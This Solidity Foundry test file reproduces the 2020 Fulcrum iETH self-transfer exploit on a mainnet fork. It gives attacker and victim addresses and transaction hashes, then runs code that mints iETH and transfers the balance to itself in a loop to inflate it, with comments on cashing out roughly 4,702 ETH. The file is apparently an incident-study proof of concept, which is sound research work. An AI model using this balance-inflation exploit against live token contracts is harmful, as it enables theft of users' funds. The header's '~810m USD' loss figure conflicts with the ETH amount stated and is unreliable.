// SPDX-License-Identifier: MIT
pragma solidity ^0.8.28;

import "forge-std/Test.sol";

// @KeyInfo
// Total Lost : ~810m USD
//  - 4,702 ETH has been cash-out
// Vulnerability Type : Business Logic Flaw (Incorrect Transfer Implementation)
// Attacked At : Mainnet, block height 10852722, 2020-09-13T9:10:01Z
// Attacker : 0xd1c0f1316140d6bf1a9e2eea8a227dad151f69b7
// Exploit Contract : N/A
// Revenue Address : 0xe925535A79544D86CF587a4117351D56c6A377d8
// Victim Contract : 0xb983e01458529665007ff7e0cddecdb74b967eb6 (Fulcrum ETH iToken)
// Vulnerable Snippet : https://etherscan.io/address/0xde744d544a9d768e96c21b5f087fc54b776e9b25#code#L1097
// Attack Txs :
//   - 0x85dc2a433fd9eaadaf56fd8156c956da23fc17e5ef83955c7e2c4c37efa20bb5, height 10852722
//   - 0x51296b581dcabc5d260c6b5b6eec2a2b03e317e8e54661dd2ab697b84f9112e9, height 10852728
//   - 0xd8906a8ab71b5c772a07f301ccb7fa539cdce03a84d88e806c8de7bc5581a6cd, height 10852734
//   - 0x783330d73a462e0a32b9b46ff139c3d6d5ff7e191746dc0f6a0b8bcffb0bcbb8, height 10852738
//   - 0xbbfc69cb015b52f1e1ca8524a2452e80db4073983b73af796e0b01d147bf72d7, height 10852742
//   - 0x1b4fc6de962c97944bfc33462b334f4c418fba4d54f3edea0ae3dc9fa3b1faf6, height 10852745
//   - 0x1dcc24254a05a44f8bcedfb0673238c3ab4ab4e09555fee2370b327fb2410230, height 10852749
//   - 0x54e45ce9b037a6e353284533958147a607ff0569670d62add99d5f5f3b9e09e9, height 10852752
//   - 0x7b1d124f2978e974bdd6453b8e6c0235184b203c4264bfa316ddddf523bbb7eb, height 10852756
//
// @Ref
// 0xCommodity : https://x.com/0xCommodity/status/1305354469354303488

contract Attacker is Test {
    ILoanTokenLogicWeth private constant iETH = ILoanTokenLogicWeth(0xB983E01458529665007fF7E0CDdeCDB74B967Eb6);

    function setUp() public {
        // The attacker spent 100,000 USDC to buy ~258.47 ETH as the initial attack capital
        // txid: 0x210841465da2dc2b1f19e75cd5afa169b57a53bfe946ad453067159e73686c3a, height 10852655, T
        vm.deal(address(this), 258.474296048320464 ether); 

        vm.createSelectFork("mainnet", 10_852_715);
    }

    function testExploit() public {
        // Funding: mint iETH with ETH
        // txid: 0x36e36cae0a52f5bffe0323c7f5c186fe9aa62348c5cb7f336db4e5680f1902d5, height 10852716, T+12m38s
        iETH.mintWithEther{value: 200 ether}(address(this));
        console.log("[Before Attack] iETH.balanceOf(ATTACKER) = %18e", iETH.balanceOf(address(this)));

        console.log("---------------------------------------------------");
        
        // Attack: exploit via self-transfer to get abnormal amount of iETH
        // txid: 0x85dc2a433fd9eaadaf56fd8156c956da23fc17e5ef83955c7e2c4c37efa20bb5, height 10852722, T+14m56s
        // txid: 0x51296b581dcabc5d260c6b5b6eec2a2b03e317e8e54661dd2ab697b84f9112e9, height 10852728, T+15m28s
        // txid: 0xd8906a8ab71b5c772a07f301ccb7fa539cdce03a84d88e806c8de7bc5581a6cd, height 10852734, T+16m3s
        // txid: 0x783330d73a462e0a32b9b46ff139c3d6d5ff7e191746dc0f6a0b8bcffb0bcbb8, height 10852738, T+16m33s
        // txid: 0xbbfc69cb015b52f1e1ca8524a2452e80db4073983b73af796e0b01d147bf72d7, height 10852742, T+17m14s
        // txid: 0x1b4fc6de962c97944bfc33462b334f4c418fba4d54f3edea0ae3dc9fa3b1faf6, height 10852745, T+17m29s
        // txid: 0x1dcc24254a05a44f8bcedfb0673238c3ab4ab4e09555fee2370b327fb2410230, height 10852749, T+18m8s
        // txid: 0x54e45ce9b037a6e353284533958147a607ff0569670d62add99d5f5f3b9e09e9, height 10852752, T+19m33s
        // txid: 0x7b1d124f2978e974bdd6453b8e6c0235184b203c4264bfa316ddddf523bbb7eb, height 10852756, T+19m56s
        for (uint i; i < 9; ++i) {
            iETH.transfer(address(this), iETH.balanceOf(address(this)));
            console.log("[Attacking] iETH.balanceOf(ATTACKER) = %18e", iETH.balanceOf(address(this)));
        }
    
        console.log("---------------------------------------------------");

        console.log("[After Attack] iETH.balanceOf(ATTACKER) = %18e", iETH.balanceOf(address(this)));

        // Realize the profit: from here, attacker holds ~101,977 iETH.
        // The attacker initiated 4 txs to burn ~4,702 iETH into ETH via calling `burnToEther()` function
        // Cashing out a total of ~4,702 ETH
        // txid: 0xc312ca7cfc23ac8e78e2fddebcc44b4cb0a3daa91267efc0367508e9caf43429
        // txid: 0x55e13687db5ff0dc80726caf99ce8868915006a9ff926b4842c6afa36c5e74ce
        // txid: 0x72cb33ec058aad0e61cac5771dc96b4e37f12cf9ea210113bc9df67bf42e49b3
        // txid: 0xd862859e20a9d914c82a2646e1155e7fa123cfe0b5f718970ea02a93c477ff71

        // Then, transferred those ETH to the revenue address = 0xe925535A79544D86CF587a4117351D56c6A377d8.
        // txid: 0xf32c5c2b6d4a93169d72803728e1aa13b0e6fe3c5ec7843a1e9db9cbbad84590
        // txid: 0x55e13687db5ff0dc80726caf99ce8868915006a9ff926b4842c6afa36c5e74ce
        // txid: 0xbcecc3a491d07011f9ec4363efc3607cc8e26548f1507bb83b10417ce525bcda
    }
}

// ------------------------------------------------------------------
//                              INTERFACES
// ------------------------------------------------------------------
// Shortened interface, removed unused methods.
interface ILoanTokenLogicWeth {
    function balanceOf(address _owner) external view returns (uint256);
    function mintWithEther(address receiver) external payable returns (uint256 mintAmount);
    function transfer(address _to, uint256 _value) external returns (bool);
}
